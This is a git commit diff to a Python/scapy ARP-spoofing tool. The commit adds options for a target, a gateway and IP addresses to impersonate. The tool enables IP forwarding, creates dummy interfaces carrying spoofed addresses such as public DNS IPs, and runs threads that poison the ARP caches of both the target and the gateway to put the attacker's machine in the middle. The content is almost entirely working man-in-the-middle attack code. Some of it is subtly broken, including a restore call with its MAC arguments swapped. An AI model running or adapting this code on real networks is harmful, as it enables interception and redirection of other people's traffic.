9ce140c7cfceabb69ad34eec62d3ad27c38f0638
kali <rekermann>
2020-07-20 23:08:31 -0400

    new and fresh

--- main.py
+++ main.py
@@ -3,7 +3,7 @@ import os
 import sys
 import spoofer
 import _thread
-
+import socket
 
 def _enable_linux_iproute():
     """
@@ -17,44 +17,144 @@ def _enable_linux_iproute():
         print(1, file=f)
 
 
-def thread_spoof(target1, target2):
-    target_mac = spoofer.get_mac(target1)
+def thread_spoof(target1, target2, target_mac):
     while True:
         spoofer.spoof(target1, target2, target_mac)
         time.sleep(1)
 
 
+def validIPAddress(ip):
+    try:
+        socket.inet_aton(ip)
+        return True
+    except socket.error:
+        return False
+
+
 def argParser():
-    if len(sys.argv) < 2:
-        print("Please call script with the ip of your chromecast")
+
+    i = 2
+    t = True
+    f = True
+    gw = ""
+    fake = []
+    targets = []
+    tmp = []
+    k = 1
+
+    while k < len(sys.argv):
+        tmp.append(sys.argv[k])
+        k = k + 1
+
+    j = len(tmp)
+
+    for x in tmp:
+        if x == "-h":
+            print("Script needs to be run as root")
+            print("Specify target to arpspoof with -t (required) - e.g -t 192.168.1.2")
+            print("Specify IP addresses to masquerade as with -f (optional) - e.g -f 1.1.1.1 1.1.1.2")
+            print("Specify default gateway -g (if not provided the script will guess) - e.g -g 192.168.1.1")
+            print("----------------------------------")
+            exit()
+        elif x == "-t":
+            t = False
+            if sys.argv[i]:
+                if validIPAddress(sys.argv[i]):
+                    target = sys.argv[i]
+                else:
+                    print(sys.argv[i] + " is not an valid ip address")
+                    exit()
+            else:
+                print("Missing value for -t")
+                exit()
+        elif x == "-f":
+            p = i
+            f = False
+            while (tmp[p] != "-g") and (tmp[p] != "-t"):
+                if validIPAddress(sys.argv[p]):
+                    fake.append(sys.argv[p])
+                else:
+                    print(sys.argv[p] + " is not an valid ip address")
+                p = p + 1
+                if p == j:
+                    break
+            if sys.argv[p]:
+                if validIPAddress(sys.argv[p]):
+                    fake.append(sys.argv[p])
+            else:
+                print(sys.argv[p] + " is not an valid ip address")
+        elif x == "-g":
+            if validIPAddress(sys.argv[i]):
+                gw = sys.argv[i]
+            else:
+                print(sys.argv[i] + " is not an valid ip address")
+
+        i = i + 1
+
+    if t:
+        print("No target specified please provide target with -t")
+        print("----------------------------------")
         exit()
-    elif len(sys.argv) < 3:
-        tmp = sys.argv[1].split('.')
-        target2 = tmp[0] + "." + tmp[1] + "." + tmp[2] + ".1"
-        print("Assuming default gateway is: " + target2)
-        print("If this is not correct please supply the ip for the default gateway as an argument")
-    else:
-        target2 = sys.argv[2]
 
-    target1 = sys.argv[1]
+    if f:
+        print("No ip addresses to masquerade as specified will just arpspoof target")
+        print("")
 
-    return target1, target2
+    if gw == "":
+        tmp = target.split('.')
+        gw = (tmp[0] + "." + tmp[1] + "." + tmp[2] + ".1")
+        print("Assuming default gateway is: " + gw)
+        print("If this is not correct please supply the ip for the default gateway as an argument with -g")
+        print("")
+
+    targets.append(target)
+    targets.append(gw)
+    targets.append(fake)
+
+    print("Arguments loaded")
+    print("Target: " + targets[0])
+    print("Default Gateway: " + targets[1])
+    if not f:
+        print("Fake ips ", targets[2])
+
+    return targets
 
 
 def main():
+    print("----------------------------------")
     targets = argParser()
     print("----------------------------------")
-    print("Creating Virtual NIC eth10 with ip: 8.8.8.8 & 8.8.4.4")
-    bash = "modprobe dummy && ip link add eth10 type dummy && ip addr add 8.8.8.8/0 brd + dev eth10 label eth10:0 && ip addr add 8.8.4.4/0 brd + dev eth10 label eth10:1"
-    os.system(bash)
-    bash = "ip a | grep -w inet"
-    os.system(bash)
-    print("Dummy NICs created")
+    print("Enabling ip_forward")
+    print("----------------------------------")
+    _enable_linux_iproute()
+    print("Getting mac address for " + targets[0])
+    target_mac = spoofer.get_mac(targets[0])
+    print("Success " + target_mac)
+    print("Getting mac address for " + targets[1])
+    gw_mac = spoofer.get_mac(targets[1])
+    print("Success " + gw_mac)
     print("----------------------------------")
 
+    if targets[2]:
+        i = 0
+        print("Creating Virtual NIC eth10 with ips: ", targets[2])
+        bash = "modprobe dummy && ip link add dummy type dummy"
+        os.system(bash)
+        for x in targets[2]:
+            bash = "ip addr add " + x + "/0 dev dummy label dummy:" + str(i)
+            os.system(bash)
+            i = i + 1
+        bash = "ip a | grep -w inet"
+        os.system(bash)
+        print("Dummy NICs created")
+        print("----------------------------------")
+
+
     print("Starting ARP spoofer thread...")
-    _thread.start_new_thread(thread_spoof, (targets[0], targets[1]))
-    _thread.start_new_thread(thread_spoof, (targets[1], targets[0]))
+
+    _thread.start_new_thread(thread_spoof, (targets[0], targets[1], target_mac))
+    _thread.start_new_thread(thread_spoof, (targets[1], targets[0], gw_mac))
+
     print("Success!")
     print("----------------------------------")
 
@@ -64,15 +164,18 @@ def main():
             pass
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
-        bash = "ip link delete eth10 type dummy"
-        os.system(bash)
-        spoofer.restore(targets[0], targets[1])
-        spoofer.restore(targets[1], targets[0])
+        if targets[2]:
+            bash = "ip link delete dummy type dummy"
+            os.system(bash)
+        spoofer.restore(targets[0], targets[1], target_mac, gw_mac)
+        spoofer.restore(targets[1], targets[0], target_mac, gw_mac)
+        print("Done")
+        print("----------------------------------")
+        exit()
 
 
 if __name__ == '__main__':
     if "nt" in os.name:
         exit()
     else:
-        _enable_linux_iproute()
         main()
--- spoofer.py
+++ spoofer.py
@@ -3,22 +3,26 @@ from scapy.layers.l2 import *
 
 
 def get_mac(ip):
-    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=10, verbose=0)
-    while ans == None:
+    i = 0
+    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
+    while not ans and i < 5:
         print("Unable to get mac for: " + ip + " retrying")
-        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=10, verbose=0)
+        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0)
+        i = i + 1
 
-    return ans[0][1].src
+    if ans:
+        return ans[0][1].src
+    else:
+        print("Failed to get mac for " + ip + " please check ip or try again later")
+        print("----------------------------------")
+        exit()
 
 
 def spoof(target_ip, host_ip, target_mac):
     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
     send(arp_response, verbose=0)
-    self_mac = ARP().hwsrc
 
 
-def restore(target_ip, host_ip):
-    target_mac = get_mac(target_ip)
-    host_mac = get_mac(host_ip)
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
+def restore(target_ip, host_ip, target_mac, gw_mac):
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=gw_mac)
     send(arp_response, verbose=0, count=7)
